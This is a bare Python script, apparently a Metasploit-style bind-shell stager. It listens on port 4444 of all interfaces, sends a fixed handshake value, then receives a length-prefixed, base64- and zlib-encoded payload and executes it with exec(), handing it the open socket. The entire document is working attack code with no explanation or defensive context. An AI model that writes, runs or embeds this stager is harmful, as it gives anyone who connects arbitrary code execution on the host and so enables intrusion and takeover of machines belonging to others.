import zlib,base64,socket,struct
b=socket.socket(2,socket.SOCK_STREAM)
b.bind(('0.0.0.0',4444))
b.listen(1)
s,a=b.accept()
import binascii
s.send(binascii.a2b_hex('2a09a1b84e231e2f02e017f4636539b8'))
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(l)
while len(d)<l:
	d+=s.recv(l-len(d))
exec(zlib.decompress(base64.b64decode(d)),{'s':s})
